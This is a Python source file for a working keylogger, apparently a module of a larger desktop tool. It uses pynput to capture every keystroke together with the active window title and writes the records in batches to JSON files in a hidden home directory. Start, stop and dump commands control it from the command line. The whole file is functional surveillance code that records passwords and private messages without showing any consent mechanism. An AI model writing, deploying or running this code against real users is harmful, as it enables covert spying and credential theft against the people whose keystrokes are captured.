# 开发者：自由的风
"""keylogger/run.py — 键盘输入监控
==================================
桌面域 ready — 全局键盘监听,记录所有按键及窗口上下文。
"""
import sys, json, os, time, threading
from pathlib import Path
from datetime import datetime

SANDBOX = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOG_DIR = Path.home() / ".gbt" / "keylogs"
LOG_DIR.mkdir(parents=True, exist_ok=True)
_logger = {"active": False, "thread": None, "buffer": [], "window": ""}

def do_start(params):
    global _logger
    if _logger["active"]:
        return {"ok": True, "status": "already_running"}
    try:
        from pynput import keyboard
        def _get_window():
            try:
                if sys.platform == "win32":
                    import ctypes
                    hwnd = ctypes.windll.user32.GetForegroundWindow()
                    buf = ctypes.create_unicode_buffer(256)
                    ctypes.windll.user32.GetWindowTextW(hwnd, buf, 256)
                    return buf.value
            except: pass
            return ""

        def on_press(key):
            try:
                k = key.char if hasattr(key, 'char') and key.char else str(key)
                _logger["buffer"].append({"key": k, "time": time.time(), "window": _get_window()})
                if len(_logger["buffer"]) > 500:
                    _flush()
            except: pass

        def _flush():
            if _logger["buffer"]:
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                fpath = LOG_DIR / f"keys_{ts}.json"
                fpath.write_text(json.dumps(_logger["buffer"], ensure_ascii=False), encoding="utf-8")
                _logger["buffer"] = []

        listener = keyboard.Listener(on_press=on_press)
        listener.daemon = True
        listener.start()
        _logger["active"] = True
        _logger["thread"] = listener
        return {"ok": True, "cap": "keylogger", "action": "start", "domain": "桌面域", "status": "started"}
    except ImportError:
        return {"ok": False, "error": "pynput未安装(pip install pynput)"}

def do_stop(params):
    global _logger
    _logger["active"] = False
    keys = len(_logger["buffer"])
    return {"ok": True, "cap": "keylogger", "action": "stop", "keys_captured": keys}

def do_dump(params):
    return {"ok": True, "buffer": _logger["buffer"][-100:], "total": len(_logger["buffer"]), "active": _logger["active"]}

HANDLERS = {"start": do_start, "stop": do_stop, "dump": do_dump}
if __name__ == "__main__":
    action = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("-") else "dump"
    params = {}
    if len(sys.argv) > 2:
        try: params = json.loads(sys.argv[2])
        except: pass
    handler = HANDLERS.get(action)
    result = handler(params) if handler else {"ok": False, "error": f"未知:{action}"}
    print(json.dumps(result, ensure_ascii=False, default=str))
